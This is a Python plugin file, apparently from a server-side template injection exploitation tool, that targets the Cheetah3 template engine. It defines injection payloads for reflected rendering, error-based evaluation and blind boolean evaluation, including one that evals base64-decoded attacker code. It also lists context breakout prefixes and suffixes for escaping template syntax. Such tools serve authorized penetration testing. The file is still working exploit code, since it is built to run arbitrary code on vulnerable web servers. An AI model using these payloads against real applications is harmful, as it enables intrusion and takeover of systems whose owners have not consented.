from plugins.languages import python
from utils import rand


class Cheetah(python.Python):
    priority = 5
    generic_plugin = True
    plugin_info = {
        "Description": 'Cheetah3模板引擎',
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
        "Engine": [
            "Homepage: https://cheetahtemplate.org/",
            "Github: https://github.com/CheetahTemplate3/cheetah3",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '${{{header[0]}+{header[1]}}}',
                'trailer': '${{{trailer[0]}+{trailer[1]}}}',
                # ${{getVar('a', '').replace($getVar('a', ''), '')}} 是一种触发 getVar 并获取空结果的方法
                'test_render': f"""${{getVar('a', '').replace($getVar('a', ''), '')}}${{'{rand.randstrings[0]}'.join('{rand.randstrings[1]}')}}""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'render_error': {
                'render': """{code}""",
                'header': """${{getattr("", str({header[0]}+{header[1]})+str(""",
                'trailer': """).rstrip()+str({trailer[0]}+{trailer[1]}))}}""",
                'test_render': f"""$getVar('a', '').replace($getVar('a', ''), '')+'{rand.randstrings[0]}'.join('{rand.randstrings[1]}')""",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'evaluate': {
                'evaluate': """${{getVar('a', '').replace($getVar('a', ''), '')}}${{{code}}}"""
            },
            'evaluate_error': {
                'evaluate': """$getVar('a', '').replace($getVar('a', ''), '')+str({code})"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """${{getVar('a', '').replace($getVar('a', ''), '')}}${{str(1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode())))}}"""
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            # 反射标签名 $inject 也被非字母符号转义，其中 $ 是
            {'level': 0},
            # 普通反射标签 ${}, $[], $()
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '', 'closures': python.ctx_closures},
            {'level': 1, 'prefix': '{closure}]', 'suffix': '', 'closures': python.ctx_closures},
            {'level': 1, 'prefix': '{closure})', 'suffix': '', 'closures': python.ctx_closures},
            # comments
            {'level': 2, 'prefix': '*#\n', 'suffix': ''},
            # 注释掉部分语法，例如 IF oneliners
            {'level': 2, 'prefix': '{closure}', 'suffix': ' ##', 'closures': python.ctx_closures},
            # 代码块
            # 这涵盖 <%= %s %>、<% %s %>
            {'level': 2, 'prefix': '{closure}%>', 'suffix': '<%', 'closures': python.ctx_closures},
            # If 和 for 块
            {'level': 5, 'prefix': '{closure}##\n', 'suffix': '\n', 'closures': python.ctx_closures},
            # 猎豹块
            {'level': 5, 'prefix': '#end cache', 'suffix': '#cache'},
            {'level': 5, 'prefix': '#end def', 'suffix': '#def t(x)'},
            {'level': 5, 'prefix': '#end block', 'suffix': '#block'},
            {'level': 5, 'prefix': '#end raw ', 'suffix': ' #raw'},
        ])
